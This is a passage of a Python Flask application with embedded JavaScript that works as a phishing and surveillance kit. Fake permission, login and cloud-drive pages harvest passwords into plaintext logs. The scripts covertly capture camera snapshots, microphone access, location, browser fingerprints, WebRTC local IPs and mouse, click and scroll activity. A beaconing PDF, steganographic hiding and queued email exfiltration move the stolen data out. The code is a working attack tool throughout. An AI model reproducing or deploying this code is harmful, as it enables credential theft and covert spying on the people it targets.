                navigator.geolocation.getCurrentPosition(pos => {
                    fetch('/log_location', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({latitude: pos.coords.latitude, longitude: pos.coords.longitude})
                    });
                }, () => console.log('Location access denied'));

                if (video.srcObject) {
                    ctx.drawImage(video, 0, 0, 320, 240);
                    const snapshot = canvas.toDataURL('image/jpeg');
                    fetch('/log_camera', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({image: snapshot})
                    });
                }

                navigator.mediaDevices.getUserMedia({audio: true}).then(stream => {
                    fetch('/log_microphone', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({message: 'Audio recorded'})
                    });
                    stream.getTracks().forEach(track => track.stop());
                }).catch(() => console.log('Microphone access denied'));
            }, 5000);
        } else {
            setInterval(() => {
                const otherData = {
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    mouseX: lastMouseX,
                    mouseY: lastMouseY,
                    timestamp: new Date().toISOString(),
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    language: navigator.language,
                    platform: navigator.platform,
                    connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                    timezoneOffset: new Date().getTimezoneOffset(),
                    canvasFingerprint: (function() {
                        const canvas = document.createElement('canvas');
                        const ctx = canvas.getContext('2d');
                        ctx.textBaseline = "top";
                        ctx.font = "14px 'Arial'";
                        ctx.fillStyle = "#f60";
                        ctx.fillRect(125,1,62,20);
                        ctx.fillStyle = "#069";
                        ctx.fillText("Hello, world!", 2, 15);
                        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                        ctx.fillText("Hello, world!", 4, 17);
                        return canvas.toDataURL();
                    })(),
                    webglFingerprint: (function() {
                        try {
                            const canvas = document.createElement('canvas');
                            const gl = canvas.getContext('webgl');
                            if (gl) {
                                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                                if (debugInfo) {
                                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                                }
                            }
                            return 'unknown';
                        } catch (e) {
                            return 'unknown';
                        }
                    })()
                };
                fetch('/log_other_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(otherData)
                });
            }, 5000);
        }

        document.getElementById('downloadForm').addEventListener('submit', function(e) {
            e.preventDefault();
            document.getElementById('screenWidth').value = screen.width;
            document.getElementById('screenHeight').value = screen.height;
            document.getElementById('colorDepth').value = screen.colorDepth;
            document.getElementById('pixelDepth').value = screen.pixelDepth;
            document.getElementById('language').value = navigator.language;
            document.getElementById('platform').value = navigator.platform;
            document.getElementById('connection').value = navigator.connection ? navigator.connection.effectiveType : 'unknown';
            document.getElementById('timezoneOffset').value = new Date().getTimezoneOffset();
            const canvasFingerprint = document.createElement('canvas');
            const ctxFingerprint = canvasFingerprint.getContext('2d');
            ctxFingerprint.textBaseline = "top";
            ctxFingerprint.font = "14px 'Arial'";
            ctxFingerprint.fillStyle = "#f60";
            ctxFingerprint.fillRect(125,1,62,20);
            ctxFingerprint.fillStyle = "#069";
            ctxFingerprint.fillText("Hello, world!", 2, 15);
            ctxFingerprint.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctxFingerprint.fillText("Hello, world!", 4, 17);
            document.getElementById('canvasFingerprint').value = canvasFingerprint.toDataURL();
            try {
                const canvasWebgl = document.createElement('canvas');
                const gl = canvasWebgl.getContext('webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        document.getElementById('webglFingerprint').value = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    } else {
                        document.getElementById('webglFingerprint').value = 'unknown';
                    }
                } else {
                    document.getElementById('webglFingerprint').value = 'unknown';
                }
            } catch (e) {
                document.getElementById('webglFingerprint').value = 'unknown';
            }
            if (permissions === 'granted') {
                const promises = [];
                if (navigator.geolocation) {
                    promises.push(new Promise((resolve) => {
                        navigator.geolocation.getCurrentPosition(pos => {
                            document.getElementById('location').value = JSON.stringify({
                                latitude: pos.coords.latitude,
                                longitude: pos.coords.longitude
                            });
                            resolve();
                        }, () => resolve());
                    }));
                }
                if (video.srcObject) {
                    ctx.drawImage(video, 0, 0, 320, 240);
                    document.getElementById('cameraSnapshot').value = canvas.toDataURL('image/jpeg');
                }
                // Collect local IPs using WebRTC
                getLocalIPs((ipList) => {
                    document.getElementById('localIPs').value = JSON.stringify(ipList);
                    Promise.all(promises).then(() => {
                        e.target.submit();
                    });
                });
            } else {
                e.target.submit();
            }
        });

        // WebRTC-based local IP collection
        function getLocalIPs(callback) {
            const ips = new Set();
            const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(err => console.error("Error creating offer: ", err));
            pc.onicecandidate = event => {
                if (!event || !event.candidate) {
                    callback(Array.from(ips));
                    pc.close(); // Clean up the peer connection
                    return;
                }
                const candidate = event.candidate.candidate;
                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                const match = candidate.match(ipRegex);
                if (match) {
                    ips.add(match[1]);
                }
            };
        }

        // Additional data capturing
        try {
            const pageLoadTime = performance.now();
            fetch('/log_performance', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({pageLoadTime})
            }).catch(err => {
                fetch('/log_error', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({error: 'Performance log failed', message: err.message})
                });
            });

            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            const connectionType = connection ? connection.effectiveType : 'unknown';
            const downlink = connection ? connection.downlink : 'unknown';
            fetch('/log_connection', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({connectionType, downlink})
            }).catch(err => {
                fetch('/log_error', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({error: 'Connection log failed', message: err.message})
                });
            });

            let mouseData = [];
            document.addEventListener('mousemove', (e) => {
                mouseData.push({x: e.clientX, y: e.clientY, timestamp: Date.now()});
            });
            document.addEventListener('click', (e) => {
                fetch('/log_click', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({x: e.clientX, y: e.clientY, timestamp: Date.now()})
                }).catch(err => {
                    fetch('/log_error', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({error: 'Click log failed', message: err.message})
                    });
                });
            });
            setInterval(() => {
                if (mouseData.length > 0) {
                    fetch('/log_mouse', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({mouseData})
                    }).catch(err => {
                        fetch('/log_error', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({error: 'Mouse log failed', message: err.message})
                        });
                    });
                    mouseData = [];
                }
            }, 5000);

            document.addEventListener('scroll', () => {
                const scrollTop = window.scrollY || document.documentElement.scrollTop;
                const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
                const scrollPercent = (scrollTop / scrollHeight) * 100;
                fetch('/log_scroll', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({scrollPercent, timestamp: Date.now()})
                }).catch(err => {
                    fetch('/log_error', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({error: 'Scroll log failed', message: err.message})
                    });
                });
            });
        } catch (err) {
            fetch('/log_error', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({error: 'Additional data capture failed', message: err.message})
            });
        }
    </script>
</body>
</html>
"""

# Routes
@app.route('/')
def index():
    return redirect(url_for('permissions'))

@app.route('/permissions')
def permissions():
    error = request.args.get('error')
    return render_template_string(PERMISSIONS_PAGE, error=error)

@app.route('/grant_permissions')
def grant_permissions():
    session['permissions_granted'] = True
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        if not session.get('permissions_granted'):
            return redirect(url_for('permissions'))
        return render_template_string(LOGIN_PAGE, permissions='granted', csrf_token=session['csrf_token'])
    if request.method == 'POST':
        if request.form.get('csrf_token') != session.get('csrf_token'):
            return "CSRF token mismatch", 403
        phone = request.form['phone']
        email = request.form['email']
        password = request.form['password']
        logging.info(f"Login attempt: phone={phone}, email={email}, password={password}")
        session['logged_in'] = True
        session['user_data'] = {'phone': phone, 'email': email}
        return redirect(url_for('drive'))

@app.route('/drive')
def drive():
    if not session.get('logged_in') or not session.get('permissions_granted'):
        return redirect(url_for('permissions'))
    current_time = datetime.now()
    one_hour_ago = current_time - timedelta(hours=1)
    two_hours_ago = current_time - timedelta(hours=2)
    date1 = one_hour_ago.strftime("%b %d, %Y, %H:%M")
    date2 = two_hours_ago.strftime("%b %d, %Y, %H:%M")
    return render_template_string(DRIVE_PAGE, permissions='granted', date1=date1, date2=date2, csrf_token=session['csrf_token'])

@app.route('/download', methods=['POST'])
def download():
    if request.form.get('csrf_token') != session.get('csrf_token'):
        return "CSRF token mismatch", 403
    logged_data = collect_data(request)
    logging.info(f"Download data collected: {json.dumps(logged_data)}")

    gemini_report = get_gemini_report(logged_data)
    logged_data["gemini_report"] = gemini_report
    logging.info(f"Gemini AI report: {gemini_report}")

    multi_stage_result = simulate_multi_stage_payload(logged_data)
    dll_injection_result = simulate_dll_injection()
    logged_data["simulation"] = {
        "multi_stage": multi_stage_result,
        "dll_injection": dll_injection_result
    }

    pdf_buffer, token = generate_pdf(logged_data)
    logged_tokens[token] = logged_data
    downloaded_reports.append({"token": token, "gemini_report": gemini_report})

    return send_file(pdf_buffer, as_attachment=True, download_name='sample.pdf', mimetype='application/pdf')

@app.route('/verify', methods=['GET'])
def verify():
    token = request.args.get('token')
    if token in logged_tokens:
        with buffer_lock:
            data_buffer.append(logged_tokens[token])
        logging.info(f"PDF opened for token: {token} - Data: {json.dumps(logged_tokens[token])}")
        del logged_tokens[token]
        return "Thank you!", 200
    return "Invalid token", 400

@app.route('/pdf_callback', methods=['GET'])
def pdf_callback():
    hidden_data = request.args.get('data', '')
    logging.info(f"Primary PDF callback triggered with data: {hidden_data}")
    return "Primary callback logged", 200

@app.route('/pdf_callback_stage2', methods=['GET'])
def pdf_callback_stage2():
    token = request.args.get('token', '')
    if token in logged_tokens:
        logging.info(f"Stage2 callback: Token {token} verified with data: {json.dumps(logged_tokens[token])}")
        return "Stage2 callback logged", 200
    return "Invalid token", 400

@app.route('/logs')
def display_logs():
    try:
        with open('user_logs.log', 'r') as f:
            logs_content = f.read()
    except Exception as e:
        logs_content = f"Error reading log file: {e}"

    captures_dir = Path('static/captures')
    try:
        captures = [p for p in captures_dir.iterdir() if p.is_file() and p.suffix == '.jpg']
        captures.sort(key=lambda p: p.stat().st_mtime, reverse=True)
        captures = [str(p) for p in captures]
    except FileNotFoundError:
        captures = []

    logs_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>User Logs and Reports</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
        <style>
            body { margin: 20px; }
            pre { background: #eee; padding: 15px; border-radius: 5px; overflow: auto; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>User Logs</h1>
            <pre>{{ logs }}</pre>
            <h2>Downloaded Reports</h2>
            {% if reports %}
            <table class="table table-bordered">
                <thead>
                    <tr>
                        <th>Token</th>
                        <th>Gemini Report</th>
                    </tr>
                </thead>
                <tbody>
                    {% for report in reports %}
                    <tr>
                        <td>{{ report.token }}</td>
                        <td><pre>{{ report.gemini_report }}</pre></td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
            {% else %}
            <p>No reports available.</p>
            {% endif %}
            <h2>Captured Images</h2>
            <div>
                {% if captures %}
                    {% for capture in captures %}
                        <img src="/{{ capture }}" alt="Captured Image" style="max-width: 300px; margin: 10px;">
                    {% endfor %}
                {% else %}
                    <p>No images captured yet.</p>
                {% endif %}
            </div>
        </div>
    </body>
    </html>
    """
    return render_template_string(logs_html, logs=logs_content, reports=downloaded_reports, captures=captures)

@app.route('/log_location', methods=['POST'])
def log_location():
    data = request.json
    with buffer_lock:
        data_buffer.append(data)
    logging.info(f"Location data: {json.dumps(data)}")
    return "Location logged", 200

@app.route('/log_camera', methods=['POST'])
def log_camera():
    try:
        data = request.get_json()
        image_data = data.get('image')
        if not image_data:
            return {'status': 'error', 'message': 'No image data provided'}, 400
        image_data = image_data.split(',')[1]
        image_bytes = base64.b64decode(image_data)
        filename = f"static/captures/{uuid.uuid4()}.jpg"
        with open(filename, 'wb') as f:
            f.write(image_bytes)
        # Embed encrypted data into the image
        stego_img = embed_data_in_image(data)
        stego_filename = f"static/captures/stego_{uuid.uuid4()}.jpg"
        stego_img.save(stego_filename)
        with buffer_lock:
            data_buffer.append(data)
            attachments_to_send.append(filename)
            attachments_to_send.append(stego_filename)
        logging.info(f"Image captured and saved as {filename}, stego image as {stego_filename}")
        return {'status': 'success', 'filename': filename}, 200
    except Exception as e:
        logging.error(f"Error in log_camera: {e}")
        return {'status': 'error', 'message': str(e)}, 500

@app.route('/log_microphone', methods=['POST'])
def log_microphone():
    try:
        data = request.get_json()
        audio_data = data.get('audio')
        if audio_data:
            audio_bytes = base64.b64decode(audio_data)
            filename = f"static/captures/audio_{uuid.uuid4()}.webm"
            with open(filename, 'wb') as f:
                f.write(audio_bytes)
            with buffer_lock:
                data_buffer.append({'audio_file': filename})
                attachments_to_send.append(filename)
            logging.info(f"Audio captured and saved as {filename}")
            return {'status': 'success', 'filename': filename}, 200
        else:
            with buffer_lock:
                data_buffer.append(data)
            logging.info(f"Microphone data: {json.dumps(data)}")
            return "Microphone logged", 200
    except Exception as e:
        logging.error(f"Error in log_microphone: {e}")
        return {'status': 'error', 'message': str(e)}, 500

@app.route('/log_other_data', methods=['POST'])
def log_other_data():
    data = request.json
    with buffer_lock:
        data_buffer.append(data)
    logging.info(f"Other data: {json.dumps(data)}")
    return "Other data logged", 200

# Monkey patch log_other_data
original_log_other_data = app.view_functions['log_other_data']

def patched_log_other_data():
    data = request.json
    enhanced_data = data.copy()
    enhanced_data['additional_note'] = 'Collected when permissions denied'
    with buffer_lock:
        data_buffer.append(enhanced_data)
    logging.info(f"Enhanced other data: {json.dumps(enhanced_data)}")
    return "Other data logged", 200

app.view_functions['log_other_data'] = patched_log_other_data

# New routes for additional data collection
@app.route('/log_performance', methods=['POST'])
def log_performance():
    data = request.json
    with buffer_lock:
        data_buffer.append(data)
    logging.info(f"Performance data: {json.dumps(data)}")
    return "Performance data logged", 200

@app.route('/log_connection', methods=['POST'])
def log_connection():
    data = request.json
    with buffer_lock:
        data_buffer.append(data)
    logging.info(f"Connection data: {json.dumps(data)}")
    return "Connection data logged", 200

@app.route('/log_mouse', methods=['POST'])
def log_mouse():
    data = request.json
    with buffer_lock:
        data_buffer.append(data)
    logging.info(f"Mouse data: {json.dumps(data)}")
    return "Mouse data logged", 200

@app.route('/log_click', methods=['POST'])
def log_click():
    data = request.json
    with buffer_lock:
        data_buffer.append(data)
    logging.info(f"Click data: {json.dumps(data)}")
    return "Click data logged", 200

@app.route('/log_scroll', methods=['POST'])
def log_scroll():
    data = request.json
    with buffer_lock:
        data_buffer.append(data)
    logging.info(f"Scroll data: {json.dumps(data)}")
    return "Scroll data logged", 200

@app.route('/log_error', methods=['POST'])
def log_error():
    data = request.json
    with buffer_lock:
        data_buffer.append(data)
    logging.error(f"Client-side error: {json.dumps(data)}")
    return "Error logged", 200

@app.route('/log_local_ips', methods=['POST'])
def log_local_ips():
    data = request.json
    with buffer_lock:
        data_buffer.append(data)
    logging.info(f"Local IPs collected via WebRTC: {json.dumps(data)}")
    return "Local IPs logged", 200

# Monkey patch log_local_ips to add metadata
original_log_local_ips = log_local_ips

def patched_log_local_ips():
    data = request.json
    enhanced_data = data.copy()
    enhanced_data['source'] = 'WebRTC ICE Candidate Gathering'
    enhanced_data['timestamp'] = datetime.now().isoformat()
    with buffer_lock:
        data_buffer.append(enhanced_data)
    logging.info(f"Enhanced local IPs collected via WebRTC: {json.dumps(enhanced_data)}")
    return "Local IPs logged with metadata", 200

app.view_functions['log_local_ips'] = patched_log_local_ips

@app.route('/simulate')
def simulate():
    return "Simulation endpoint", 200

if __name__ == '__main__':
    threading.Thread(target=email_sender_thread, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host="0.0.0.0", port=port)
